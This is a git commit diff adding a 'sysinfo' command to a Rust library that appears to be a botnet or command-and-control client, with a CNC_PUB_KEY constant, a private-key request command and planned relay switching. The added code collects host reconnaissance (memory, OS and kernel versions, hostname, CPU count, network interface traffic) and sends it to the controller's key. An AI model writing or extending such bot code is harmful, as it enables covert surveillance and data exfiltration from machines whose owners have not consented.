8833605bb5ed16d0757854109ad07100e874febe
zenneh <wertelaerssenne@icloud.com>
2025-03-25 14:45:16 +0100

    implemented sysinfo command

--- bns-lib/src/command/mod.rs
+++ bns-lib/src/command/mod.rs
@@ -9,7 +9,7 @@ pub enum Commands {
     Enable(EnabledCommand),
     PrivateKey(RequestPrivateKeyCommand),
     Help(HelpCommand),
-    Sysinfo(),
+    Sysinfo(SysInfoCommand),
     // TODO:
     // SwitchRelay
     // SwitchFileServer
@@ -35,6 +35,7 @@ impl Commands {
             "enable" => Some(Commands::Enable(EnabledCommand {})),
             "private_key" => Some(Commands::PrivateKey(RequestPrivateKeyCommand {})),
             "help" => Some(Commands::Help(HelpCommand {})),
+            "info" => Some(Commands::Sysinfo(SysInfoCommand {})),
             _ => None,
         }
     }
@@ -46,6 +47,7 @@ impl Commands {
             Commands::Enable(cmd) => cmd.execute(state, session).await,
             Commands::PrivateKey(cmd) => cmd.execute(state, session).await,
             Commands::Help(cmd) => cmd.execute(state, session).await,
+            Commands::Sysinfo(cmd) => cmd.execute(state, session).await,
         }
     }
 }
@@ -57,6 +59,53 @@ pub trait Command {
 }
 
 pub struct SysInfoCommand {}
+
+impl Command for SysInfoCommand {
+    async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
+        use sysinfo::{Networks, System};
+        let mut sys = System::new_all();
+        sys.refresh_all();
+
+        let mut content = String::new();
+        content.push_str(&format!("=> system:\n"));
+        content.push_str(&format!("total memory: {} bytes\n", sys.total_memory()));
+        content.push_str(&format!("used memory : {} bytes\n", sys.used_memory()));
+        content.push_str(&format!("total swap  : {} bytes\n", sys.total_swap()));
+        content.push_str(&format!("used swap   : {} bytes\n", sys.used_swap()));
+
+        content.push_str(&format!("System name:             {:?}\n", System::name()));
+        content.push_str(&format!(
+            "System kernel version:   {:?}\n",
+            System::kernel_version()
+        ));
+        content.push_str(&format!(
+            "System OS version:       {:?}\n",
+            System::os_version()
+        ));
+        content.push_str(&format!(
+            "System host name:        {:?}\n",
+            System::host_name()
+        ));
+
+        content.push_str(&format!("NB CPUs: {}\n", sys.cpus().len()));
+
+        let networks = Networks::new_with_refreshed_list();
+        content.push_str("=> networks:\n");
+        for (interface_name, data) in &networks {
+            content.push_str(&format!(
+                "{interface_name}: {} B (down) / {} B (up)\n",
+                data.total_received(),
+                data.total_transmitted(),
+            ));
+        }
+
+        session
+            .send_msg(&content, PublicKey::parse(CNC_PUB_KEY).unwrap())
+            .await?;
+
+        Ok(())
+    }
+}
 
 pub struct HelloWorldCommand {}
 
